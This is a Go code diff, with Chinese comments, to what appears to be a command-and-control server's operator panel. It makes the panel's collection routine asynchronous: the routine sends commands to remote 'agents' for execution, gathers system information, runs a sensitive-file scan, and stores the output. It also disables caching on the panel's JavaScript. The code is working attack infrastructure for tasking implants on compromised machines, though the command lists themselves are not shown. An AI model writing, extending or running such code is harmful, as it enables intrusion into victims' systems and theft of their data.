@@ -273,6 +273,8 @@ func (s *Server) c2classicStatic(w http.ResponseWriter, r *http.Request) {
 	case strings.HasSuffix(p, ".js"):
 		w.Header().Set("Content-Type", "application/javascript; charset=utf-8")
 	}
+	// 迭代频繁：禁用启发式缓存，刷新即拿新版（旧 app.js 缓存曾致面板全 404 假象）
+	w.Header().Set("Cache-Control", "no-cache")
 	w.Write(b)
 }
 
@@ -553,8 +555,15 @@ func (s *Server) c2xScheduleCmd(w http.ResponseWriter, r *http.Request, agent, c
 	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": cmd})
 }
 
-// c2xCollect sysinfo/sensitive 采集（同步，缓存 + 事件）。
+// c2xCollect sysinfo/sensitive 采集（异步：9 条命令需 30~70 秒，同步会卡死
+// 按钮/HTTP 超时——立即返回，完成后经 SSE 事件送达前端渲染）。
 func (s *Server) c2xCollect(w http.ResponseWriter, r *http.Request, agent, kind string, isWin bool) {
+	// 独立 ctx：r.Context() 在 handler 返回后即取消，goroutine 内全部调用会瞬间失败
+	go s.c2xCollectRun(context.Background(), agent, kind, isWin)
+	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": kind})
+}
+
+func (s *Server) c2xCollectRun(ctx context.Context, agent, kind string, isWin bool) {
 	var cmds []string
 	if kind == "sysinfo" {
 		cmds = c2SysinfoCmds(isWin)
@@ -567,8 +576,9 @@ func (s *Server) c2xCollect(w http.ResponseWriter, r *http.Request, agent, kind 
 	} else {
 		sb.WriteString("===== 敏感文件扫描 =====\n\n")
 	}
+	cli := c2Client()
 	for _, c := range cmds {
-		out, err := s.c2ExecAndWait(r, agent, c)
+		out, err := c2RunTaskWait(ctx, cli, agent, "exec", map[string]any{"cmd": c}, 90*time.Second)
 		if err != nil {
 			if kind == "sysinfo" {
 				sb.WriteString(fmt.Sprintf("--- %s ---\n[错误] %s\n\n", c, err.Error()))
@@ -603,7 +613,6 @@ func (s *Server) c2xCollect(w http.ResponseWriter, r *http.Request, agent, kind 
 		"agent_id": agent, "content": snap.Content, "collected_at": snap.CollectedAt, "id": snap.ID,
 	})
 	s.c2Audit(agent, "", kind+"_collect", "classic")
-	writeJSON(w, 200, map[string]any{"command_id": c2xRandID(), "command": kind})
 }
 
 func (s *Server) c2xMessages(w http.ResponseWriter, r *http.Request) {
